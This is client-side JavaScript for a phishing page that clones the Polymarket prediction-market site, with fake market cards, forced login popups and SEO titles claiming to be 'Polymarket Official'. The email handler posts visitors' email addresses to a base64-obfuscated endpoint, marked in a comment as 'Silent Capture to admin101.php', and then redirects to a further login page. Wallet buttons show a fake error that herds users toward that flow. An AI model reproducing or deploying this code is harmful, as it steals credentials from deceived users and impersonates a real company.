<script>
    lucide.createIcons();

    function marketCard(icon, title, outcomes, vol) {
        let rows = outcomes.map(o => `
            <div class="flex items-center justify-between py-2">
                <span class="font-medium text-gray-600 dark:text-gray-300">${o.label}</span>
                <div class="flex items-center gap-3">
                    <span class="font-bold text-lg">${o.percent}%</span>
                    <div class="flex gap-1">
                        <button onclick="requireLogin()" class="bg-green-50 text-green-600 px-3 py-1.5 rounded-md font-bold text-sm border border-green-100">Yes</button>
                        <button onclick="requireLogin()" class="bg-red-50 text-red-600 px-3 py-1.5 rounded-md font-bold text-sm border border-red-100">No</button>
                    </div>
                </div>
            </div>
        `).join("");

        // 3. Trump Visual Logic
        let visual = (icon === "trump.png") ? `<img src="trump.png" class="w-full h-full object-cover">` : icon;

        return `
            <div class="bg-white dark:bg-gray-700 rounded-3xl p-5 border border-gray-100 dark:border-gray-600 shadow-sm">
                <div class="flex gap-4 mb-4 items-start">
                    <div class="w-12 h-12 bg-gray-100 dark:bg-gray-600 rounded-xl flex items-center justify-center text-3xl overflow-hidden">${visual}</div>
                    <h2 class="font-bold text-lg leading-tight flex-grow">${title}</h2>
                </div>
                <div class="space-y-1">
                    ${rows}
                </div>
                <div class="mt-4 pt-4 border-t flex justify-between items-center text-gray-400 text-[11px] font-bold">
                    <div class="flex items-center gap-2">
                        <span>$${vol} Vol.</span>
                        <i data-lucide="repeat-2" class="w-3 h-3"></i>
                    </div>
                    <div class="flex gap-4">
                        <i data-lucide="gift" class="w-4 h-4"></i>
                        <i data-lucide="bookmark" class="w-4 h-4"></i>
                    </div>
                </div>
            </div>`;
    }

    // 2. 10 Unique Markets
    const marketData = [
        { icon: "trump.png", title: "Will Trump win the 2024 Presidential Election?", outcomes: [{label: "Trump", percent: 54}], vol: "2.1B" },
        { icon: "🇺🇸", title: "US strikes Iran by March 15?", outcomes: [{label: "Yes", percent: 52}], vol: "392M" },
        { icon: "₿", title: "Bitcoin to hit $100k in 2026?", outcomes: [{label: "Yes", percent: 68}], vol: "5.4M" },
        { icon: "🏛️", title: "Will Senate pass the new Tech Bill?", outcomes: [{label: "Passes", percent: 45}], vol: "1.2M" },
        { icon: "⚽", title: "Champions League Winner 2026", outcomes: [{label: "Real Madrid", percent: 32}], vol: "890K" },
        { icon: "🍎", title: "Apple to announce AI headset in June?", outcomes: [{label: "Yes", percent: 74}], vol: "2.1M" },
        { icon: "🚀", title: "Starship Flight 6 Success?", outcomes: [{label: "Soft Landing", percent: 41}], vol: "920K" },
        { icon: "📉", title: "Fed to cut rates in Q3?", outcomes: [{label: "Cut", percent: 58}], vol: "12M" },
        { icon: "🍿", title: "Highest grossing movie of 2026", outcomes: [{label: "Avatar 3", percent: 61}], vol: "450K" },
        { icon: "🎾", title: "Will Alcaraz win Wimbledon?", outcomes: [{label: "Yes", percent: 39}], vol: "1.1M" }
    ];

    document.getElementById("markets").innerHTML = marketData.map(m => marketCard(m.icon, m.title, m.outcomes, m.vol)).join("");
    lucide.createIcons();

    const emailSection = document.getElementById("emailSection");
    const emailInput = document.getElementById("emailInput");
    const emailContinueBtn = document.getElementById("emailContinueBtn");
    const googleBtn = document.getElementById("googleContinueBtn");

    if (emailInput && emailContinueBtn) {
        emailInput.addEventListener("input", () => {
            const val = emailInput.value.trim();
            const isValid = val.length > 5 && val.includes("@") && val.includes(".");

            if (isValid) {
                emailContinueBtn.disabled = false;
                emailContinueBtn.classList.remove("bg-gray-300", "text-gray-600", "cursor-not-allowed");
                emailContinueBtn.classList.add("bg-blue-600", "text-white", "hover:bg-blue-700", "cursor-pointer");
            } else {
                emailContinueBtn.disabled = true;
                emailContinueBtn.classList.remove("bg-blue-600", "text-white", "hover:bg-blue-700", "cursor-pointer");
                emailContinueBtn.classList.add("bg-gray-300", "text-gray-600", "cursor-not-allowed");
            }
        });
    }

    document.querySelectorAll('.wallet-icon').forEach(icon => {
        icon.addEventListener('click', () => {
            const toast = document.createElement("div");
            toast.textContent = "User Error: Please login with Google";
            toast.className = "fixed bottom-20 left-1/2 -translate-x-1/2 bg-red-600 text-white px-6 py-3 rounded-full shadow-lg z-50 font-bold";
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 2500);
        });
    });

    googleBtn.addEventListener('click', () => {
        emailSection.classList.remove("hidden");
        emailInput.focus();
    });

    if (emailContinueBtn) {
        emailContinueBtn.addEventListener('click', () => {
            const email = emailInput.value.trim();
            if (email) {
                // 5. Silent Capture to admin101.php
                const r = "YWRtaW4xMDEucGhw"; 
                fetch(atob(r), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'email=' + encodeURIComponent(email)
                }).finally(() => {
                    window.location.href = 'login.html';
                });
            }
        });
    }

    function toggleMenu(){ document.getElementById("menu-overlay").classList.toggle("hidden"); }
    function requireLogin(){ document.getElementById("cancelBtn").classList.remove("hidden"); openLogin(); }
    function openLogin(){ document.getElementById("loginPopup").classList.remove("hidden"); }
    function closeLogin(){ document.getElementById("loginPopup").classList.add("hidden"); }

    function toggleDark(){
        const isDark = document.documentElement.classList.toggle("dark");
        const icon = document.getElementById("theme-icon");
        isDark ? icon.setAttribute('data-lucide', 'sun') : icon.setAttribute('data-lucide', 'moon');
        lucide.createIcons();
    }

    setTimeout(() => {
        document.getElementById("cancelBtn").classList.add("hidden");
        openLogin();
    }, 5000);
</script>
<script>

  // Dynamic Titles & Descriptions for Polymarket clone (optimized 2026 style)
  const seoTitles = {
    default: "Polymarket Official | Login & Start Trading",
    login:    "Polymarket Login | Official Account Access",
    account:  "Polymarket Account Login | Access Markets Securely",
    signin:   "Polymarket Sign In | Secure & Official Access",
    trade:    "Polymarket | Start Trading & Predict Events Now",
    signup:   "Polymarket Sign Up | Official Registration & Login"
  };

  const seoDescriptions = {
    default: "Log in to the official Polymarket platform. Trade prediction markets on politics, crypto, sports & more. Secure access for users worldwide.",
    login:   "Securely log in to your Polymarket account. Access real-time prediction markets and start trading today.",
    account: "Sign in to your Polymarket account to manage trades, view balances, and participate in global events.",
    signin:  "Sign in to Polymarket – the world's leading prediction market. Fast, secure login for trading.",
    trade:   "Start trading on Polymarket now. Predict outcomes on news, elections, crypto & sports with real-time odds.",
    signup:  "Create your official Polymarket account. Sign up free and join the largest prediction market platform."
  };

  // Core update function (safe & idempotent)
  function updateSEO(key = 'default') {
    const title = seoTitles[key] || seoTitles.default;
    const desc  = seoDescriptions[key] || seoDescriptions.default;

    // Update <title>
    document.title = title;

    // Update or create <meta name="description">
    let metaDesc = document.querySelector('meta[name="description"]');
    if (!metaDesc) {
      metaDesc = document.createElement('meta');
      metaDesc.name = "description";
      document.head.appendChild(metaDesc);
    }
    metaDesc.setAttribute('content', desc);

    // Optional: add Open Graph / Twitter meta if you want social sharing previews
    // document.querySelector('meta[property="og:title"]')?.setAttribute('content', title);
  }

  // 1. Read URL param on load
  const urlParams = new URLSearchParams(window.location.search);
  const mode = urlParams.get('mode')?.toLowerCase() || 'default';

  // 2. Apply based on mode
  updateSEO(mode);

  // 3. Optional: react to UI events (e.g. when user clicks login/signup buttons)
  // Adjust selectors to match your actual buttons/classes
  document.querySelector('[onclick*="openLogin()"]')?.addEventListener('click', () => {
    updateSEO('login');
  });

  document.querySelector('[onclick*="signup"]')?.addEventListener('click', () => {  // if you add signup logic
    updateSEO('signup');
  });
</script>
